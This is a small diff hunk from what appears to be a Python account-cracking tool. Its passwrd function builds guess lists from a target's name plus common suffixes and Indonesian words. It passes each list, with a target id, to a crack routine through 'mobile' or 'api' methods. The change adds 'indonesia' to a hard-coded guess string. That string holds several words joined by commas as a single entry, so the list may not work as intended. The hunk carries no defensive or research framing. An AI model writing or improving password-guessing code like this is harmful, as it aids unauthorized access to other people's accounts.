@@ -519,7 +519,7 @@ def passwrd():
 					pwv.append(nmf)
 					pwv.append(frs+'123')
 					pwv.append(frs+'12345')
-			pwv.append('sayang,bismillah,kimcil')
+			pwv.append('sayang,bismillah,kimcil,indonesia')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'api' in method:
